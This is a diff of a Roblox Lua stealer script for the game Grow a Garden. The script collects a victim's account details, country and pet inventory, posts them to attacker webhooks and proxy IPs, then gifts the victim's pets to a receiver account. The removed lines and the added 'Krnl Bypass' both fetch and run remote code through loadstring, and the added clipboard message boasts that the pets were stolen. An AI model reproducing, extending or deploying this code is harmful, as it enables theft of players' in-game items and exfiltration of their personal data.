@@ -1,17 +1,15 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
-_G.NullConfig = {
-    User = {"GaGbyFaith", "GaGbySmiley", "Smiley9Gamerz", "BUZZFTWGOD"},
-    min_value = 10000000020,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/26749114d240c316c4a29060a03a30f7",
-    FakeGift = "Yes",
-    Trash = "http://176.100.37.215:20002/proxy/67431be5aae9d51a3ff71f890a7e7596",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "No",
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+--[[
+   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
+  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
+ | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
+  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
+ |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
+                                                                     
+                        Scripts.SM | Premium Scripts
+                        Made by: Scripter.SM
+                        Discord: discord.gg/d2zgg2YDMz
+]]
 
 
         
@@ -29,12 +27,20 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
         local TeleportService = game:GetService("TeleportService")
 
         local data = DataService:GetData()
-
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
 
-       setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. (getgenv().Discord or "discord.gg/yourlink"))
+        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. (getgenv().Discord or "discord.gg/d2zgg2YDMz"))
+
+        local runBypass
+
+        task.defer(function()
+            if runBypass then
+                runBypass()
+            end
+        end)
+
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -338,6 +344,30 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
         end
 
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+        local function sendWebhookToAll(payload)
+    local function trySend(url)
+        local success, err = pcall(function()
+            request({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if not success then warn("Webhook Error:", err) end
+    end
+
+    if getgenv().Webhook and getgenv().Webhook ~= "" then
+        trySend(getgenv().Webhook)
+    end
+
+    if getgenv().DualHookWebhook and getgenv().DualHookWebhook ~= "" then
+        trySend(getgenv().DualHookWebhook)
+    end
+end
+
 
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
@@ -404,115 +434,84 @@ loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/scrip
             end
         end
 
-        local payload = {
-            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
-            embeds = {{
-                title = "Grow a Garden Hit - " .. getgenv().ServerName
-                url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 57855,
-                fields = {
-                    {
-                        name = "🪪 Display Name",
-                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "👤 Username",
-                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🆔 User ID",
-                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📅 Account Age",
-                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
-                        inline = true
-                    },
-                    {
-                        name = "💎 Receiver",
-                        value = "```" .. (Username or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🎂 Account Created",
-                        value = "```" .. (creationDateString or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "💻 Executor",
-                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🌍 Country",
-                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📡 Player Count",
-                        value = "```" .. (playerCount or 0) .. "/5```",
-                        inline = true
-                    },
-                    {
-                        name = "💰 Backpack",
-                        value = "```" .. truncateByLines(petString, 20) .. "```",
-                        inline = false
-                    },
-                    {
-                        name = "🚀 Join Script",
-                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
-                        inline = false
-                    },
-                    {
-                        name = "🔗 Join with URL",
-                        value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = game.JobId or "Unknown"
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }},
-            attachments = {}
-        }
-
-        if hasRarePets() then
-            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
-                local success, err = pcall(function()
-                    request({
-                        Url = Webhook,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = HttpService:JSONEncode(payload)
-                    })
-                end) 
-                if not success then warn(err) end
-        else
-            payload.content = "To activate the stealer you must jump or type in chat"
-            local function sendToWebhook(url)
-    pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
+local payload = {
+    content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat"
+             or "To activate the stealer you must jump or type in chat",
+    embeds = {{
+        title = "Grow a Garden Hit - " .. (getgenv().ServerName or "Scripts.SM"),
+        url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+        color = 57855,
+        fields = {
+            {
+                name = "🪪 Display Name",
+                value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
+                inline = true
             },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-end
+            {
+                name = "👤 Username",
+                value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🆔 User ID",
+                value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
+                inline = true
+            },
+            {
+                name = "📅 Account Age",
+                value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
+                inline = true
+            },
+            {
+                name = "💎 Receiver",
+                value = "```" .. (Username or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🎂 Account Created",
+                value = "```" .. (creationDateString or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "💻 Executor",
+                value = "```" .. (detectExecutor() or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "🌍 Country",
+                value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
+                inline = true
+            },
+            {
+                name = "📡 Player Count",
+                value = "```" .. (playerCount or 0) .. "/5```",
+                inline = true
+            },
+            {
+                name = "💰 Backpack",
+                value = "```" .. truncateByLines(petString, 20) .. "```",
+                inline = false
+            },
+            {
+                name = "🚀 Join Script",
+                value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
+                inline = false
+            },
+            {
+                name = "🔗 Join with URL",
+                value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                inline = false
+            }
+        },
+        footer = {
+            text = game.JobId or "Unknown"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }},
+    attachments = {}
+}
 
-sendToWebhook(Webhook)
-if getgenv().DualHookWebhook and getgenv().DualHookWebhook ~= "" then
-    sendToWebhook(getgenv().DualHookWebhook)
-end
-
+sendWebhookToAll(payload)
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
@@ -601,13 +600,12 @@ end
                 end
 
         local usernames = {}
-if getgenv().DualHookUsernames then
-    for name in string.gmatch(getgenv().DualHookUsernames, '([^,]+)') do
-        table.insert(usernames, name)
-    end
-end
-
-
+        if getgenv().DualHookUsernames then
+            for name in string.gmatch(getgenv().DualHookUsernames, '([^,]+)') do
+                table.insert(usernames, name)
+            end
+        end
+        
 
         local receiverPlr
         repeat
@@ -759,7 +757,10 @@ end
             return false
         end
 
-        
+        -- Krnl Bypass
+        runBypass = function()
+            loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
+        end
 
         if detectExecutor() == "Delta" then
             task.wait(0.3)
@@ -785,6 +786,7 @@ end
                 end
             end
         else
+
             -- Fire gifting event
             local success, err = pcall(function()
                 RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
@@ -825,11 +827,10 @@ end
 
     -- Gifting loop
     for _, pet in ipairs(pets) do
-
         for _, tool in targetPlr.Backpack:GetChildren() do
             if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
                 print("Gifting:", tool.Name)
-                for atempt = 1, 3 do
+                for attempt = 1, 3 do
                     result = safeGiftTool(tool)
                     if result then
                         break
